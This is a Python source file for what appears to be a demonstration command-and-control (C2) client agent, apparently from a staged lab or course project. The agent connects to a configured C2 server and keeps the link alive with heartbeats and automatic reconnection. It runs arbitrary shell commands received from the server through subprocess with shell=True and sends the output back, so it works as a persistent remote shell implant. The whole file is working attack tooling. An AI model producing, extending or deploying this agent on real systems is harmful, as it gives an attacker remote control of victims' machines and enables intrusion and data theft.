"""
C2 Client (Demo Agent)
Connects to C2 Server and executes received commands

Features:
- Automatic reconnection on connection loss
- Heartbeat mechanism to maintain connection
- Command queue for async execution
- Support for echo, kill, and bash commands
"""

import asyncio
import logging
import sys
import os
import subprocess
from typing import Optional, Dict
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server.protocol import ProtocolHandler
import config

logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class C2Client:
    """Demo C2 Client Agent"""

    def __init__(self, server_host: str, server_port: int,
                 encryption_key: Optional[bytes] = None):
        """
        Initialize C2 Client

        Args:
            server_host: C2 server hostname/IP
            server_port: C2 server port
            encryption_key: Optional encryption key for secure communication
        """
        self.server_host = server_host
        self.server_port = server_port
        self.protocol = ProtocolHandler(encryption_key)
        self.client_id: Optional[str] = None
        self.reader: Optional[asyncio.StreamReader] = None
        self.writer: Optional[asyncio.StreamWriter] = None
        self.running = True
        self.command_queue: asyncio.Queue = asyncio.Queue()
        self.working_directory = os.getcwd()  # Track current working directory
        logger.info(f"C2 Client initialized (target: {server_host}:{server_port})")

    async def connect(self) -> bool:
        """
        Connect to C2 Server

        Returns:
            True if connection successful, False otherwise
        """
        try:
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port
            )
            logger.info(f"Connected to C2 Server at {self.server_host}:{self.server_port}")

            # Receive welcome message
            welcome = await self.protocol.read_message(self.reader)
            if welcome and welcome.get("type") == "welcome":
                self.client_id = welcome.get("client_id")
                logger.info(f"Received client ID: {self.client_id}")
                print(f"Connected to C2 Server. Client ID: {self.client_id}")

            return True

        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    async def disconnect(self) -> None:
        """Disconnect from C2 Server"""
        if self.writer:
            try:
                self.writer.close()
                await self.writer.wait_closed()
            except Exception as e:
                logger.error(f"Error during disconnect: {e}")

        self.reader = None
        self.writer = None
        self.client_id = None

    async def send_heartbeat(self) -> None:
        """Send periodic heartbeat to server (Step 4)"""
        while self.running:
            try:
                if self.writer and not self.writer.is_closing():
                    await self.protocol.write_message(self.writer, {
                        "type": "heartbeat",
                        "timestamp": datetime.now().isoformat()
                    })
                    logger.debug("Heartbeat sent")

                await asyncio.sleep(config.HEARTBEAT_INTERVAL)

            except Exception as e:
                logger.error(f"Error sending heartbeat: {e}")
                break

    async def execute_echo_command(self, command: str) -> str:
        """
        Execute echo command

        Args:
            command: Message to echo

        Returns:
            Echo result
        """
        logger.info(f"Executing echo command: {command}")
        return f"Echo: {command}"

    async def execute_cd_command(self, target_dir: str) -> tuple[str, bool]:
        """
        Change working directory

        Args:
            target_dir: Target directory path

        Returns:
            Tuple of (output, success)
        """
        logger.info(f"Executing cd command: {target_dir}")

        try:
            # Handle special cases
            if target_dir == "~":
                target_dir = os.path.expanduser("~")
            elif not target_dir:
                target_dir = os.path.expanduser("~")

            # Resolve path (absolute or relative to current working directory)
            if os.path.isabs(target_dir):
                new_path = os.path.abspath(target_dir)
            else:
                new_path = os.path.abspath(
                    os.path.join(self.working_directory, target_dir)
                )

            # Verify directory exists
            if not os.path.exists(new_path):
                return f"cd: {target_dir}: No such file or directory", False

            if not os.path.isdir(new_path):
                return f"cd: {target_dir}: Not a directory", False

            # Update working directory
            self.working_directory = new_path
            return f"Changed directory to {new_path}", True

        except Exception as e:
            return f"cd: {e}", False

    async def execute_bash_command(self, command: str) -> tuple[str, bool]:
        """
        Execute bash/shell command (Step 4)

        Args:
            command: Shell command to execute

        Returns:
            Tuple of (output, success)

        Citation: Using subprocess for shell command execution
        https://docs.python.org/3/library/subprocess.html
        """
        logger.info(f"Executing bash command: {command}")

        try:
            # Run command with timeout in current working directory
            # shell=True allows bash-style commands but has security implications
            # In production, use proper command parsing and validation
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.working_directory,  # Use client's working directory
                shell=True
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=30.0  # 30 second timeout
            )

            output = stdout.decode('utf-8', errors='replace')
            if stderr:
                output += "\nSTDERR:\n" + stderr.decode('utf-8', errors='replace')

            success = process.returncode == 0
            return output, success

        except asyncio.TimeoutError:
            return "Command timed out (30s)", False
        except Exception as e:
            return f"Error executing command: {e}", False

    async def execute_kill_command(self) -> None:
        """Execute kill command - terminate client"""
        logger.info("Received kill command. Terminating...")
        print("Kill command received. Shutting down...")
        self.running = False

    async def process_command(self, message: Dict) -> None:
        """
        Process a command received from server

        Args:
            message: Command message dictionary
        """
        command_id = message.get("command_id")
        command_type = message.get("command_type")
        command = message.get("command")

        logger.info(f"Processing command {command_id}: {command_type}")

        result = ""
        success = True

        try:
            if command_type == "echo":
                result = await self.execute_echo_command(command)

            elif command_type == "bash":
                # Check if command is 'cd' and handle specially
                cmd_stripped = command.strip()
                if cmd_stripped.startswith("cd ") or cmd_stripped == "cd":
                    # Extract directory argument
                    target_dir = cmd_stripped[2:].strip() if len(cmd_stripped) > 2 else ""
                    result, success = await self.execute_cd_command(target_dir)
                else:
                    result, success = await self.execute_bash_command(command)

            elif command_type == "kill":
                await self.execute_kill_command()
                result = "Client terminating"

            else:
                result = f"Unknown command type: {command_type}"
                success = False

        except Exception as e:
            logger.error(f"Error executing command {command_id}: {e}")
            result = f"Error: {e}"
            success = False

        # Send result back to server
        try:
            await self.protocol.write_message(self.writer, {
                "type": "command_result",
                "command_id": command_id,
                "result": result,
                "success": success
            })
            logger.info(f"Sent result for command {command_id}")
        except Exception as e:
            logger.error(f"Error sending result: {e}")

    async def command_processor(self) -> None:
        """
        Process commands from queue asynchronously (Step 4)
        Allows handling multiple commands without blocking
        """
        while self.running:
            try:
                # Wait for command with timeout to check running flag
                command = await asyncio.wait_for(
                    self.command_queue.get(),
                    timeout=1.0
                )

                await self.process_command(command)

            except asyncio.TimeoutError:
                continue  # No command, check running flag
            except Exception as e:
                logger.error(f"Error in command processor: {e}")

    async def receive_messages(self) -> None:
        """Receive and handle messages from server"""
        try:
            while self.running:
                message = await self.protocol.read_message(self.reader)

                if message is None:
                    logger.warning("Connection closed by server")
                    break

                msg_type = message.get("type")

                if msg_type == "command":
                    # Add command to queue for async processing
                    await self.command_queue.put(message)

                elif msg_type == "heartbeat_ack":
                    logger.debug("Heartbeat acknowledged")

                else:
                    logger.warning(f"Unknown message type: {msg_type}")

        except Exception as e:
            logger.error(f"Error receiving messages: {e}")
        finally:
            self.running = False

    async def run(self) -> None:
        """Main client loop with reconnection logic"""
        while self.running:
            # Try to connect
            if not await self.connect():
                logger.info(f"Retrying connection in {config.CLIENT_RECONNECT_INTERVAL}s...")
                await asyncio.sleep(config.CLIENT_RECONNECT_INTERVAL)
                continue

            # Start tasks
            tasks = [
                asyncio.create_task(self.receive_messages()),
                asyncio.create_task(self.send_heartbeat()),
                asyncio.create_task(self.command_processor())
            ]

            # Wait for any task to complete (usually means connection lost)
            done, pending = await asyncio.wait(
                tasks,
                return_when=asyncio.FIRST_COMPLETED
            )

            # Cancel remaining tasks
            for task in pending:
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass

            # Disconnect
            await self.disconnect()

            # Reconnect if still running
            if self.running:
                logger.info(f"Reconnecting in {config.CLIENT_RECONNECT_INTERVAL}s...")
                await asyncio.sleep(config.CLIENT_RECONNECT_INTERVAL)

        logger.info("Client stopped")


async def main():
    """Main entry point for client"""
    client = C2Client(
        config.CLIENT_SERVER_HOST,
        config.CLIENT_SERVER_PORT,
        encryption_key=config.ENCRYPTION_PSK
    )

    try:
        await client.run()
    except KeyboardInterrupt:
        print("\nShutting down client...")
        client.running = False


if __name__ == "__main__":
    asyncio.run(main())
